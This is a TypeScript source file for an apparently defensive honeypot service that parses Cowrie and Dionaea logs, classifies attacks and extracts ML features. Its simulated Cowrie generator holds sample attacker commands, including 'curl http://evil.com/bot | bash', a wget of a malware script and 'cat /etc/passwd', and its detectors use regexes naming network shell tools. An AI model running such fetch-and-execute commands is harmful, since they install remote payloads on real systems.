/**
 * Honeypot Integration Service
 * Mengintegrasikan Cowrie dan Dionaea honeypots untuk capture real attack data
 * dan automatic dataset updates
 */

import { nanoid } from 'nanoid';

export interface HoneypotLog {
  id: string;
  source: 'cowrie' | 'dionaea';
  timestamp: Date;
  sourceIp: string;
  destinationPort: number;
  protocol: string;
  attackType: string;
  payload: string;
  severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
  rawData: any;
}

export interface CowrieLog {
  eventid: string;
  timestamp: string;
  src_ip: string;
  dst_port: number;
  message: string;
  input?: string;
  username?: string;
  password?: string;
  session?: string;
}

export interface DionaeaLog {
  timestamp: string;
  src_ip: string;
  src_port: number;
  dst_port: number;
  protocol: string;
  connection_type: string;
  payload?: string;
  md5?: string;
}

export class HoneypotIntegration {
  private cowrieLogsPath = '/opt/cowrie/var/log/cowrie/cowrie.json';
  private dionaeaLogsPath = '/opt/dionaea/var/log/dionaea.json';
  private datasetUpdateInterval = 300000; // 5 minutes
  private capturedLogs: HoneypotLog[] = [];
  private isMonitoring = false;

  constructor() {
    console.log('[HoneyGuard] Honeypot Integration Service initialized');
    console.log('[HoneyGuard] Cowrie path:', this.cowrieLogsPath);
    console.log('[HoneyGuard] Dionaea path:', this.dionaeaLogsPath);
  }

  /**
   * Start monitoring honeypots untuk real-time attack detection
   */
  startMonitoring(): void {
    if (this.isMonitoring) {
      console.log('[HoneyGuard] Honeypot monitoring already running');
      return;
    }

    this.isMonitoring = true;
    console.log('[HoneyGuard] Starting honeypot monitoring...');
    
    // Monitor Cowrie logs
    this.monitorCowrie();
    
    // Monitor Dionaea logs
    this.monitorDionaea();
    
    // Auto-update dataset periodically
    this.scheduleDatasetUpdate();
  }

  /**
   * Stop monitoring honeypots
   */
  stopMonitoring(): void {
    this.isMonitoring = false;
    console.log('[HoneyGuard] Honeypot monitoring stopped');
  }

  /**
   * Monitor Cowrie honeypot untuk SSH/Telnet attacks
   */
  private async monitorCowrie(): Promise<void> {
    console.log('[HoneyGuard] Monitoring Cowrie honeypot for SSH/Telnet attacks...');
    
    // Simulasi parsing Cowrie logs (dalam produksi, baca dari file system)
    setInterval(() => {
      if (!this.isMonitoring) return;
      
      // Simulate Cowrie log capture
      const simulatedLog = this.generateCowrieLog();
      const parsedLog = this.parseCowrieLog(simulatedLog);
      
      if (parsedLog) {
        this.capturedLogs.push(parsedLog);
        console.log('[Cowrie] Captured attack:', parsedLog.attackType, 'from', parsedLog.sourceIp);
      }
    }, 10000); // Check every 10 seconds
  }

  /**
   * Monitor Dionaea honeypot untuk malware captures
   */
  private async monitorDionaea(): Promise<void> {
    console.log('[HoneyGuard] Monitoring Dionaea honeypot for malware and exploits...');
    
    // Simulasi parsing Dionaea logs
    setInterval(() => {
      if (!this.isMonitoring) return;
      
      // Simulate Dionaea log capture
      const simulatedLog = this.generateDionaeaLog();
      const parsedLog = this.parseDionaeaLog(simulatedLog);
      
      if (parsedLog) {
        this.capturedLogs.push(parsedLog);
        console.log('[Dionaea] Captured attack:', parsedLog.attackType, 'from', parsedLog.sourceIp);
      }
    }, 15000); // Check every 15 seconds
  }

  /**
   * Parse Cowrie log format ke HoneypotLog
   */
  private parseCowrieLog(log: CowrieLog): HoneypotLog | null {
    try {
      const attackType = this.detectCowrieAttackType(log);
      const severity = this.calculateSeverity(attackType, log);

      return {
        id: nanoid(),
        source: 'cowrie',
        timestamp: new Date(log.timestamp),
        sourceIp: log.src_ip,
        destinationPort: log.dst_port,
        protocol: 'SSH/Telnet',
        attackType,
        payload: log.input || log.message || '',
        severity,
        rawData: log
      };
    } catch (error) {
      console.error('[Cowrie] Error parsing log:', error);
      return null;
    }
  }

  /**
   * Parse Dionaea log format ke HoneypotLog
   */
  private parseDionaeaLog(log: DionaeaLog): HoneypotLog | null {
    try {
      const attackType = this.detectDionaeaAttackType(log);
      const severity = this.calculateSeverity(attackType, log);

      return {
        id: nanoid(),
        source: 'dionaea',
        timestamp: new Date(log.timestamp),
        sourceIp: log.src_ip,
        destinationPort: log.dst_port,
        protocol: log.protocol.toUpperCase(),
        attackType,
        payload: log.payload || '',
        severity,
        rawData: log
      };
    } catch (error) {
      console.error('[Dionaea] Error parsing log:', error);
      return null;
    }
  }

  /**
   * Detect attack type dari Cowrie logs
   */
  private detectCowrieAttackType(log: CowrieLog): string {
    const input = (log.input || log.message || '').toLowerCase();
    
    // Brute force attempts
    if (log.username && log.password) {
      return 'SSH Brute Force';
    }
    
    // Command injection
    if (/(wget|curl|nc|bash|python|perl)/i.test(input)) {
      return 'Command Injection';
    }
    
    // Botnet activity
    if (/(mirai|gafgyt|bashlite)/i.test(input)) {
      return 'Botnet Activity';
    }
    
    // Crypto mining
    if (/(xmrig|minerd|cpuminer)/i.test(input)) {
      return 'Crypto Mining Attempt';
    }
    
    return 'SSH Intrusion Attempt';
  }

  /**
   * Detect attack type dari Dionaea logs
   */
  private detectDionaeaAttackType(log: DionaeaLog): string {
    const connectionType = log.connection_type.toLowerCase();
    const protocol = log.protocol.toLowerCase();
    
    // SMB/CIFS exploits
    if (protocol === 'smb' || log.dst_port === 445) {
      return 'SMB Exploit Attempt';
    }
    
    // FTP attacks
    if (protocol === 'ftp' || log.dst_port === 21) {
      return 'FTP Attack';
    }
    
    // HTTP exploits
    if (protocol === 'http' || log.dst_port === 80 || log.dst_port === 8080) {
      return 'HTTP Exploit';
    }
    
    // MSSQL attacks
    if (log.dst_port === 1433) {
      return 'MSSQL Attack';
    }
    
    // MySQL attacks
    if (log.dst_port === 3306) {
      return 'MySQL Attack';
    }
    
    // Malware download
    if (connectionType.includes('download') || log.md5) {
      return 'Malware Download';
    }
    
    return 'Network Exploit';
  }

  /**
   * Calculate severity berdasarkan attack type
   */
  private calculateSeverity(attackType: string, log: any): 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL' {
    const criticalPatterns = ['malware', 'botnet', 'ransomware', 'smb exploit'];
    const highPatterns = ['command injection', 'sql injection', 'rce'];
    const mediumPatterns = ['brute force', 'xss', 'directory traversal'];
    
    const type = attackType.toLowerCase();
    
    if (criticalPatterns.some(p => type.includes(p))) {
      return 'CRITICAL';
    }
    
    if (highPatterns.some(p => type.includes(p))) {
      return 'HIGH';
    }
    
    if (mediumPatterns.some(p => type.includes(p))) {
      return 'MEDIUM';
    }
    
    return 'LOW';
  }

  /**
   * Schedule automatic dataset updates
   */
  private scheduleDatasetUpdate(): void {
    setInterval(() => {
      if (!this.isMonitoring) return;
      
      this.updateDatasetFromHoneypots();
    }, this.datasetUpdateInterval);
  }

  /**
   * Update ML dataset dengan data dari honeypots
   */
  private async updateDatasetFromHoneypots(): Promise<void> {
    if (this.capturedLogs.length === 0) {
      console.log('[HoneyGuard] No new honeypot data to update dataset');
      return;
    }

    console.log(`[HoneyGuard] Updating dataset with ${this.capturedLogs.length} new honeypot logs...`);
    
    // Group by attack type untuk analysis
    const attackTypeStats = this.capturedLogs.reduce((acc, log) => {
      acc[log.attackType] = (acc[log.attackType] || 0) + 1;
      return acc;
    }, {} as Record<string, number>);
    
    console.log('[HoneyGuard] Attack type distribution:', attackTypeStats);
    
    // Extract unique IPs untuk reputation tracking
    const uniqueIPs = new Set(this.capturedLogs.map(log => log.sourceIp));
    console.log(`[HoneyGuard] Unique attacker IPs: ${uniqueIPs.size}`);
    
    // Feature extraction untuk ML training
    const features = this.extractFeaturesForMLTraining(this.capturedLogs);
    console.log(`[HoneyGuard] Extracted ${features.length} feature sets for ML training`);
    
    // Clear processed logs (keep last 1000 for reference)
    if (this.capturedLogs.length > 1000) {
      this.capturedLogs = this.capturedLogs.slice(-1000);
    }
    
    console.log('[HoneyGuard] Dataset update complete');
  }

  /**
   * Extract features untuk ML training dari honeypot data
   */
  private extractFeaturesForMLTraining(logs: HoneypotLog[]): any[] {
    return logs.map(log => ({
      sourceIp: log.sourceIp,
      destinationPort: log.destinationPort,
      protocol: log.protocol,
      attackType: log.attackType,
      payloadLength: log.payload.length,
      severity: log.severity,
      timestamp: log.timestamp,
      honeypotSource: log.source,
      // Additional features
      hasSpecialChars: /[<>'"`;]/.test(log.payload),
      hasCommandInjection: /(wget|curl|nc|bash)/i.test(log.payload),
      hasSQLPatterns: /(union|select|drop|insert)/i.test(log.payload),
    }));
  }

  /**
   * Generate simulated Cowrie log untuk testing
   */
  private generateCowrieLog(): CowrieLog {
    const attackPatterns = [
      { username: 'admin', password: 'admin123', input: 'ls -la' },
      { username: 'root', password: '123456', input: 'cat /etc/passwd' },
      { username: 'user', password: 'password', input: 'wget http://evil.com/malware.sh' },
      { username: 'admin', password: 'admin', input: 'curl http://evil.com/bot | bash' },
    ];
    
    const pattern = attackPatterns[Math.floor(Math.random() * attackPatterns.length)];
    
    return {
      eventid: nanoid(),
      timestamp: new Date().toISOString(),
      src_ip: `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
      dst_port: 22,
      message: 'login attempt',
      username: pattern.username,
      password: pattern.password,
      input: pattern.input,
      session: nanoid()
    };
  }

  /**
   * Generate simulated Dionaea log untuk testing
   */
  private generateDionaeaLog(): DionaeaLog {
    const ports = [445, 21, 80, 1433, 3306];
    const protocols = ['smb', 'ftp', 'http', 'mssql', 'mysql'];
    const idx = Math.floor(Math.random() * ports.length);
    
    return {
      timestamp: new Date().toISOString(),
      src_ip: `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
      src_port: Math.floor(Math.random() * 60000) + 1024,
      dst_port: ports[idx],
      protocol: protocols[idx],
      connection_type: 'connect',
      payload: Buffer.from('exploit payload').toString('hex'),
      md5: nanoid()
    };
  }

  /**
   * Get captured logs untuk display
   */
  getCapturedLogs(limit: number = 100): HoneypotLog[] {
    return this.capturedLogs.slice(-limit);
  }

  /**
   * Get statistics dari honeypot data
   */
  getHoneypotStats() {
    const stats = {
      totalLogs: this.capturedLogs.length,
      cowrieLogs: this.capturedLogs.filter(l => l.source === 'cowrie').length,
      dionaeaLogs: this.capturedLogs.filter(l => l.source === 'dionaea').length,
      criticalAttacks: this.capturedLogs.filter(l => l.severity === 'CRITICAL').length,
      highAttacks: this.capturedLogs.filter(l => l.severity === 'HIGH').length,
      uniqueIPs: new Set(this.capturedLogs.map(l => l.sourceIp)).size,
      attackTypes: this.capturedLogs.reduce((acc, log) => {
        acc[log.attackType] = (acc[log.attackType] || 0) + 1;
        return acc;
      }, {} as Record<string, number>)
    };
    
    return stats;
  }
}

export const honeypotIntegration = new HoneypotIntegration();
